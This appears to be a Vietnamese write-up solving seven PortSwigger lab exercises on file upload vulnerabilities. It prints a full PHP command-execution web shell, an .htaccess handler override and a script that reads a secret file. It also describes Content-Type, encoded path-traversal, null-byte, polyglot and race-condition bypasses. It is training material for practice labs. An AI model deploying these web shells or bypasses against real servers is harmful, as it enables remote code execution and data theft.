# File upload vulnerabilities - Portswigger
## 1. Remote code execution via web shell upload
Bài này khá đơn giản mình chỉ cần upload một file .php chứa webshell lên thay vì ảnh bình thường là được
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_9767f6ee6f146e7dbb1b1fc725bd1efd.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088442&Signature=WkGi0We5UV4qvQlDa%2B2FHiMXXrQ%3D)

Ta dùng lệnh để đọc nội dung trong file secret và có được secret là `TswuW44vMztdKYo8mmAF4TkkJgZjPP8H`
![image]([https://github.com/b4shu206/PortSwigger/blob/main/FILE%20UPLOAD%20VULNERABILITY/image/upload_d3e6ff0bebadb6a39d64d978767febf3.png](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_d3e6ff0bebadb6a39d64d978767febf3.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088453&Signature=2kUgya7nVZvkzTmsv2jAsrhvjL0%3D))

Nạp secret và solved được lab.
## 2. Web shell upload via Content-Type restriction bypass
Lần này ta chỉ việc thay đổi content-type thành `image/png` là đã upload thành công webshell

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_21afc9803724dea78bd4f0ca2576a2e4.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088370&Signature=SoIWNqzsBEi79jQY2ODSm4UzyWE%3D)

Dùng lệnh đọc và lấy được secret `KnLwUfLjerQDbWM72RyBeFGqdI6zSjkh`

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_4e2829ff5d061c54dc2a08fe69008373.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088473&Signature=9rk6nz9gAI5U3LNXVNePzFxUI7E%3D)

Submit và đã solved được lab.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_8bc4dc85e7201c750ffb7553fb27b2d7.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088481&Signature=aKeeavNLo4guHzd1pcoDc4HKeIs%3D)
## 3. Web shell upload via path traversal
Ta đọc đề thì thấy ta cần kết hợp với lỗi path traversal. Mình có thử upload lên nhưng webshell không hoạt động

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_ee41d5c786b757c569cc76d59b630cb1.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088487&Signature=jb92lQq9dqvwuiJw3XNUDZdx3Cc%3D)

Vậy ta cần đổi tên file để có thể upload ra ngoài thư mục avatars và webshell ta nó sẽ hoạt động.
Ta search payload ở [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2db7888f0337e5a7fbe19b252cebede0.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088496&Signature=bAb1ptKeUpx5xB2jKcBbTTKSVok%3D)

Có vẻ nhưng `../` , `..\` , `../\` đều đã bị chặn. Nên mình đã dùng `%2e%2e%2f` thì đã upload được thành công ra ngoài.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_a9928d9e1ece0c73af5264f1c042279f.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088504&Signature=DZvdmL%2BaefyTCOsy%2B3V1kisnI8w%3D)

Truy cập bằng `files/test.php` và đọc file thì được secret `ivFsLt8JIcyD0Y8EriCp5xEg3Mre4OOW`

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_ef1d493a6cfb0cc0b371f94c4801a3d2.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088511&Signature=ADwayR5cU%2FqyUnZVHOrCDHQw8H0%3D)

Submit và đã solved được lab.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_002b20ff8dff86126747972e8f26835f.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088518&Signature=IyIPgnCiNHxL%2B8XdcOl%2Btj14db0%3D)

## 4. Web shell upload via extension blacklist bypass
Lần này đã bị block hết đuôi `.php`

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_61d2bbd12aeb918cbd270e12ce801c25.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088523&Signature=dx7Y1a3fxpGWp4DAcyDU3XEvuno%3D)

Và không upload được, mình có thử các đuôi khác như php3,php5,php7,... thì file không hoạt động.
Đọc hint thì thấy cần up 2 file khác nhau

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_8e7e0ce4271b69053a3a4c367c9b86cb.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088530&Signature=tiIB1%2FCQBkXhf4D8qjnj%2FfcznY4%3D)

Đọc document thì phát hiện ra ta có thể upload file .htaccess và ghi đè lên nó

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_b9f4e9110e8e9bf36f398fc0c6ba329a.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088536&Signature=jf0IJ3VgjrIeKB2pzcqAeub95Qc%3D)

Ta có thể cho 1 đuôi bất kỳ nhưng vẫn hoạt động như file .php bằng nội dung sau thì file .test sẽ hoạt động như .php
```
<FilesMatch "\.test$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2c285545e52b19386199d279f314dca9.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088558&Signature=NhP8MedCxbenjsUYxZtHiCe4R7Q%3D)

Giờ ta chỉ việc sửa đuôi file và tên file là `test.test` và upload thôi

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_7af32d6c85d755a1add67bf5badeed4e.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088564&Signature=qbYOHNQ7qvg8BHQ3lCmehoc7B%2Fw%3D)

Vậy là ta đã upload thành công giờ chỉ việc đọc file và lấy được secret là `VQMWq5rpLrkIqlUiBzngnRvFd9skJLJX`

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_ca4b11f2b5f8c4ec706f7c872f8cb4c8.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088573&Signature=ORIw4EHvsgCd2qpnwV50f1TaeN8%3D)

Nạp và ta đã solved được lab.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_b246bfb0be5a7f48d0fbf85faf3c5793.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088578&Signature=sDREjzHSQ6X%2BQYljUOu7Hq%2FD6s0%3D)

## 5. Web shell upload via obfuscated file extension
Ta tiếp tục đọc document

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_cabe38a74f9711faec2c1e02b990ca20.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088584&Signature=tKMHlz6G%2BA8JitMLy417adetryk%3D)

Thì bày này chỉ chấp nhận việc ta upload file `.jpg` hoặc là `.png`

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2e0dcb867c689993c501f73011c89642.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088592&Signature=R8NoJCCdaSAaNEhXWzdptR3Rpmo%3D)

Và nó chỉ cần có đuôi `.jpg` hoặc `.png` ở cuối là được ta có thể bypass bằng cách thêm byte null trước đuôi `.png` thì vẫn bypass qua được nhưng đuôi `.png` sẽ biến mất

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_c0d94b34df7476790fb29b6ddecd9b55.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088599&Signature=BCiPVtkDlQcIyRJvuQliy5PXAak%3D)

Vậy là ta đã upload thành công. Giờ chỉ việc đọc file và có được secret là `rHv3lt6txH4VT1iYVdvztrkbOh7qgGQa`

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2aab46f26d16b6f8d3c419de796c8bfd.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088607&Signature=sr3lQ15KKJEx9%2FtAcqA%2FqLFkPR8%3D)

Và solved được lab

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_22b10e5e696772b58a19c80c097bb230.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088615&Signature=cbfjMtLGLdqKhCBvnB3%2FpOmz1K8%3D)

## 6. Remote code execution via polyglot web shell upload
Vì bài này chỉ check content trong có chính xác là bức ảnh hay không nên ta thử đổi tên file là `.php` thì vẫn upload bình thường

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_1fbf52fa9296bd7165e0f5e62b012d8c.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088623&Signature=QUr%2ButYbzJ4SWek18aDq9nsgss4%3D)

Giờ ta chỉ việc chèn webshell ở dưới nội dung ảnh và up lên là được

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2fc771c6bf479a855bd2e328c69d04ab.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088634&Signature=xX6qh55y%2FS%2FH3VIrCJQb7IQagmQ%3D)

Và ta đã upload thành công webshell lên và lấy được secret là `tVhTcZSPJdxe2ObMmUN7bY2oletBZsnU`

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_bafeb4bc08087a106feff5c6b976f424.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088642&Signature=bdOEO3WAER2r1nFCk4W5hCJtuPA%3D)

Submit và đã solved được lab

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_5f4d67f37b53e7cc7d03957c707fa0a6.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088648&Signature=lJuA381P5JFmUj%2BJDXHHWfKTP3Q%3D)

## 7. Web shell upload via race condition
Mình thử upload 1 loạt file lên thì đều không thành công

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_5caff772fe2baf66a0b7bb3621da4acc.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088658&Signature=OyZEmRgnpfYAWin6ldZVMgJBSQ0%3D)

Nên đọc thử document

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_f9cf9a1e95dc6c0f06cc9916fa2e5af4.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088668&Signature=jt1xR1IoeUrDPTK2QY%2FMiyg2xO0%3D)

Và đọc hint thì ta có sourcecode
```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```
Thì có vẻ giống như document nó vẫn tải lên và lưu trữ  sau đó mới chuyển rồi kiểm tra và khi không vượt qua kiểm tra thì mới xóa.
Trong thời gian di chuyển thì mình có thể chèn thêm 1 request `GET` để chạy file mình vừa upload lên
Nội dung file là:
```php
<?php
echo "<pre>" . htmlspecialchars(file_get_contents('/home/carlos/secret')) . "</pre>";
?>
```
Và ta gộp thành group và sử dụng chức năng `Send group (parallel)` để có thể gửi 2 request này cùng lúc

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_fa032671c7c6753740c0d84268e68abd.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088683&Signature=ydZ133HhbNqMxRtqmIUVaOHC86o%3D)

Cách này còn tùy thuộc vào mạng nhà bạn và độ nhân phẩm =))
Sau rất nhiều lần gửi đi gửi lại thì mình đã đọc và có được secret.

![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_9a6a63e85c2e36dd2bcc1684cd736646.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088690&Signature=FzDe%2B3qrCq9UqyTqEuXMgzgYiMg%3D)
Đem đi nạp và solved được lab.
![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_6828c3e7aadcd41cea2dd228285b7458.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1750088353&Signature=VQE6PtNQ5ivYTamV8owQKVDOlrc%3D)
